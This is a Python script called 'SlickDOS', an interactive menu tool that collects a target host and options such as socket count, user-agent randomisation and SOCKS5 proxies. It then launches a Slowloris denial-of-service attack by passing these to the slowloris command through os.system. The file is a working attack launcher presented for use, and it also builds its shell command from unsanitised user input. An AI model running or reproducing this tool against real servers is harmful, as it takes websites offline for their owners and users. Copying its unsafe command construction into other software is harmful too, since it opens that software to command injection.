import threading
import os
import time
import sys
from colorama import Fore 
from colorama import Style 
from colorama import Back 
import colorama
from art import text2art
colorama.init()
def Slowloris1():
    print(f"{Fore.GREEN}  Module Loaded")
    port = ''
    verbose = ''
    sockets = '50'
    ua = '-ua'
    use_proxy = ''
    phost=''
    pport = ''
    https = ''
    sleeptime = ''
    host = ''
    if input(f"{Fore.YELLOW} Use Default settings? y/n (Default = y): ") == "n":
        port =  "-p " + input(" Enter port: ")
        print(f"{Fore.LIGHTBLUE_EX} Added arg '{port}' {Fore.YELLOW}")
        a = input(" Do you want verbose Output? y/n: ")
        if str(a).strip().lower() == "y":
            verbose = '-v'
            print(f"{Fore.LIGHTBLUE_EX} Added arg '-v'{Fore.YELLOW}")
        sockets = "-s " + str(input("Socket Count (Default = 50 Higher numbers block more threads: "))
        print(f"{Fore.LIGHTBLUE_EX} Added arg '{sockets}'{Fore.YELLOW}")

        b = input("Randomise user agents? Default = y: ")
        if str(b).strip().lower() == "n":
            ua = ''
            print(f"{Fore.LIGHTBLUE_EX} Removed arg '-ua'{Fore.YELLOW}")
        else: 
            print(f"{Fore.LIGHTBLUE_EX} Kept arg '-ua'{Fore.YELLOW}")
    

        c = input(" Using SOCKS5 proxies? (Default = n)")
        if str(c).strip().lower() == "y":
            use_proxy = "-x"
            phost = (f"--proxy-host {input('Proxy Host: ')}")

            print(f"{Fore.LIGHTBLUE_EX} Added arg {phost} {Fore.YELLOW}")

            pport = (f"--proxy-port {input('Proxy Port: ')}")
            print(f"{Fore.LIGHTBLUE_EX} Added arg '{pport}'{Fore.YELLOW}")

        d = input("Use HTTPS for requests? y/n: ")
        if str(d).strip().lower() == "y":
            https = '-https'
            print(f"{Fore.LIGHTBLUE_EX} Added arg {https} {Fore.YELLOW}")
            

        sleeptime = (f"--sleeptime {input('Time to sleep between headers (Enter 15 for default): ')} ")    
        print(f"{Fore.LIGHTBLUE_EX} Added arg {sleeptime} {Fore.YELLOW}")

    host = input("Input target (Domain or IP) (without https or http)")
    print(f"{Fore.LIGHTGREEN_EX} Starting attack in 5 Seconds, Press Ctrl + C to cancel{Fore.LIGHTCYAN_EX}")            

    os.system('slowloris ' + verbose + ' ' + port + ' ' + sockets + ' ' + ua + ' ' + use_proxy + ' ' + phost + ' ' + pport + ' ' + https + ' ' + sleeptime + ' ' + host)

print(f'{Fore.RED}{Back.BLACK} {(text2art("SLICKDOS", "random-medium"))} {Style.RESET_ALL}{Fore.RED}' )
print(f"{Style.RESET_ALL}Welcome to SlickDOS the DOS Thingamajig!")
time.sleep(0.2)
print(f"{Fore.LIGHTBLUE_EX}[1] Slowloris (Low bandwith Attack) \n[2] Exit{Fore.YELLOW}")
e = input(f" Choose Module to use: {Style.RESET_ALL} ")
if e == '1':
    Slowloris1()
else:
    sys.exit()    







